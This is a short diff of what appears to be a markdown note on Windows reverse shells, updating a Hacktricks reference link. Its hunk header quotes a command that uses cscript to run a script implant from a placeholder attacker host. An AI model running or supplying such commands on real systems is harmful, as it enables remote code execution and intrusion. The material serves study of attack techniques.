@@ -19,4 +19,6 @@ C:\> cscript.exe //E:jscript \\<attacker_IP>\path\to\implant.vbs
 ---
 ## References
 
-- [Hacktricks: Windows Reverse Shells](https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/windows)
+### Hacktricks
+
+- [Hacktricks: Windows Reverse Shells](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/reverse-shells/windows.html)
